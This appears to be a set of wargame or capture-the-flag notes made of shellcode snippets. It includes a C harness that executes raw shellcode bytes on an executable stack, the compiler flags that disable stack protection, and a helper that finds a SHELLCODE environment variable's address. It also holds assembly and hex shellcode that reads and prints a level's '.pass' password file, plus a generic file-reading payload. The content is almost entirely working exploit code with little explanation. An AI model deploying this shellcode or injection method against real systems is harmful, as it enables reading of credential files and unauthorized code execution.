
unsigned char code[]= "\xeb\x31\x5f\x48\x31\xf6\x6a\x02\x58\x0f\x05\x50\x5f\x54\x5e\x48\x83\xc6\x40\x6a\x40\x5a\x48\x31\xc0\x0f\x05\x50\x5a\x54\x5e\x48\x83\xc6\x40\x6a\x01\x5f\x6a\x01\x58\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05\xe8\xca\xff\xff\xff\x2f\x74\x6d\x70\x2f\x68\x65\x6c\x6c\x6f";
int main()
{
        int (*ret)() = (int(*)())code;
        ret();
}

gcc -fno-stack-protector -z execstack test.c -o test


------------------------------

#include <stdio.h>
#include <stdlib.h>
int main(void) { printf("%p\n", getenv("SHELLCODE")); }

-----------------------

SECTION .text
    global _start

_start:
    jmp       ender

starter:
    xor       rax, rax
    xor       rbx, rbx
    xor       rcx, rcx
    xor       rdx, rdx
open:
    pop       rdi         ; Pop string
    xor       rsi, rsi    ; O_RDONLY
    push      0x5         ; open()
    pop       rax
    int 0x80
read:
    push      rax         ; fd
    pop       rdi
    push      rsp
    pop       rsi
    add       rsi, 0x40
    push      0x40
    pop       rdx
    push      0x3           ; read()
    pop       rax
    int 0x80
write:
    push      rax
    pop       rdx
    push      rsp
    pop       rsi
    add       rsi, 0x40
    push      0x1         ; STDOUT_FILENO
    pop       rdi
    push      0x4         ; write()
    pop       rax
    int 0x80
end:
    xor       rdi, rdi
    push      0x1         ; exit()
    pop       rax
    int 0x80
ender:
    call      starter     ; Push string
    db "/home/users/level05/.pass"

\xeb\x3d\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x5f\x48\x31\xf6\x6a\x02\x58\x0f\x05\x50\x5f\x54\x5e\x48\x83\xc6\x40\x6a\x40\x5a\x48\x31\xc0\x0f\x05\x50\x5a\x54\x5e\x48\x83\xc6\x40\x6a\x01\x5f\x6a\x01\x58\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05\xe8\xbe\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x35\x2f\x2e\x70\x61\x73\x73

_start:
	xor	eax, eax
	xor	ebx, ebx
	xor	ecx, ecx
	xor	edx, edx
	jmp	two

one:
	pop	ebx

	mov byte	al, 0x5     ; open
	xor	ecx, ecx
	int	0x80

	mov	esi, eax
	jmp	read

exit:
	mov byte	al, 0x1     ; exit
	xor	ebx, ebx
	int	0x80

read:
	mov	ebx, esi
	mov byte	al, 0x3     ; read
	sub	esp, 0x1
	lea	ecx, [esp]
	mov byte	dl, 0x1
	int	0x80

	xor	ebx, ebx
	cmp	ebx, eax
	je	exit

	mov byte	al, 0x4     ; write
	mov byte	bl, 0x1
	mov byte	dl, 0x1
	int	0x80

	add	esp, 0x1
	jmp	read

two:
	call	one
	db	"file_name"





SECTION .text
  global _start

_start:
  jmp       ender

starter:
  xor       eax, eax
  xor       ebx, ebx
  xor       ecx, ecx
  xor       edx, edx

write:
  mov byte  al, 4
  mov byte  dl, 14
  pop       rcx
  mov byte  bl, 1
  int 0x80
  xor       eax, eax

exit:
  mov byte  al, 1
  xor       ebx, ebx
  add       ebx, 42
  int 0x80

ender:
  call      starter
  db "Hello, World!\n"
